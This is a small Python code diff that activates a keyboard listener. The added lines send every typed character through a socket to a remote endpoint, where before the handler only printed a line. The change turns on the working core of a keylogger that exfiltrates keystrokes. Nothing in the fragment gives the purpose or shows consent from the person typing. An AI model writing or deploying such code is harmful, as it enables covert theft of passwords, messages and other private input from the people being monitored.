@@ -13,9 +13,10 @@ if __name__ == "__main__":
         from pynput.keyboard import Key, Listener
 
         def on_press(key):
-            print("--------------")
-            # sock.sendto(str.encode(key), _ENDPOINT)
-        
+            if hasattr(key,"char"):
+                sock.sendto(str.encode(key.char), _ENDPOINT)
+            else:
+                pass
         with Listener(on_press=on_press) as listener:
             listener.join()
     # main1()
